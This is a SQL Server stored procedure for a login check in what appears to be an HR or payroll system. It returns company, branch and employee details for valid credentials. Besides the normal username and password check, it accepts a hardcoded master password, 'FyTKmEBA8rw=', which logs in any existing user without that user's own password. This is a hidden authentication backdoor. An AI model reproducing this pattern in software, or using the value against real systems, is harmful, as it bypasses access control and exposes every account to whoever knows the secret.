

---29/1/2021 (EDIT BY MEHUL ) (SP WITH NOLOCK)---
CREATE  PROCEDURE [dbo].[SP_CheckLogin]                    

   @Username  varchar(50) output          
  ,@Password  varchar(50) output          
  ,@IPAdd   varchar(20)          
  ,@Cmp_Id  numeric(18,0) output          
  ,@dateformate numeric(18,0) output          
  ,@Emp_ID  numeric = null output          
  ,@Branch_ID  numeric = null output          
  ,@Login_Rights_ID numeric = null output          
  ,@Cmp_Name  varchar(100) output          
  ,@Image_name varchar(50) output          
  ,@Branch_Name varchar(100) output          
  ,@tdate   datetime output          
  ,@ydate   datetime output          
  ,@Predate  datetime output          
  ,@Get_Login_ID numeric(18,2) output 
  ,@Row_ID numeric(18,2) output         
  ,@Emp_Search_Type int output         
 AS 
	SET NOCOUNT ON 
	SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED
	SET ARITHABORT ON

        declare @userid as numeric(9)          
        declare @uname as varchar(30)          
           
             
	 if @Emp_ID = 0           
		   set @Emp_ID = null          
          
             
 if exists(select Login_Id from T0011_Login WITH (NOLOCK) where Login_Name=@Username and Login_password=@password and Isnull(Emp_ID,0) = Isnull(@Emp_ID,Isnull(Emp_ID,0)) )          
   begin          
           

    select @Get_Login_ID=Login_ID,@Login_Rights_ID=Login_Rights_ID,@Username=Login_Name,@Cmp_id=cmp_Id ,@Emp_ID= Emp_ID,@Branch_Id = Branch_Id, @tdate = getdate(),@ydate = getdate()-1,@Predate = getdate()-2,@Emp_Search_Type=Emp_Search_Type from T0011_Login WITH (NOLOCK) where Login_Name=@Username and Login_password=@password and Isnull(Emp_ID,0) = Isnull(@Emp_ID,Isnull(Emp_ID,0))                                
    select @dateformate=date_format,@Cmp_Name = Cmp_Name ,@Image_name = Image_name  from T0010_Company_master WITH (NOLOCK) where Cmp_ID= @Cmp_id          
    select @Branch_Name = Branch_Name from T0030_Branch_master WITH (NOLOCK) where Branch_Id= @Branch_Id          

 	                       
    update T0012_COMPANY_CRT_LOGIN_MASTER          
     set   Last_login_date = getdate()          
    where cmp_id = @cmp_Id          
		
   end          
else  if @password='FyTKmEBA8rw='
   begin            
    if  exists(select Login_Id from T0011_Login WITH (NOLOCK) where Login_Name=@Username  and Isnull(Emp_ID,0) = Isnull(@Emp_ID,Isnull(Emp_ID,0)) )                      
	Begin 

    select @Get_Login_ID=Login_ID,@Login_Rights_ID=Login_Rights_ID,@Username=Login_Name,@Cmp_id=cmp_Id ,@Emp_ID= Emp_ID,@Branch_Id = Branch_Id, @tdate = getdate(),@ydate = getdate()-1,@Predate = getdate()-2,@Emp_Search_Type=Emp_Search_Type from T0011_Login WITH (NOLOCK) where Login_Name=@Username 
	and Isnull(Emp_ID,0) = Isnull(@Emp_ID,Isnull(Emp_ID,0))                                  
    select @dateformate=date_format,@Cmp_Name = Cmp_Name ,@Image_name = Image_name  from T0010_Company_master WITH (NOLOCK) where Cmp_ID= @Cmp_id            
    select @Branch_Name = Branch_Name from T0030_Branch_master WITH (NOLOCK) where Branch_Id= @Branch_Id            
   end    
  end         
else          

   begin          
     set @Username=0          
     set @password=0          
     set @cmp_Id=0          
     set @dateformate=2          
     set @Emp_ID =  0          
     set @Branch_ID =  0          
     set @tdate = getdate()           
     set @ydate = getdate()-1          
     set @Predate = getdate()-2 
     set @Emp_Search_Type=0
   end          
           

  If Isnull(@Emp_ID,0) = 0          
    set @Emp_ID = 0            
           
  If Isnull(@Branch_ID,0) = 0          
    set @Branch_ID = 0            
            
  If Isnull(@Login_Rights_ID,0) = 0          
    set @Login_Rights_ID = 0            

  if isnull(@Row_ID ,0) = 0
    set  @Row_ID=0

 If Isnull(@Emp_Search_Type,0) = 0          
    set @Emp_Search_Type = 0  	
            
 RETURN          
          
          
          

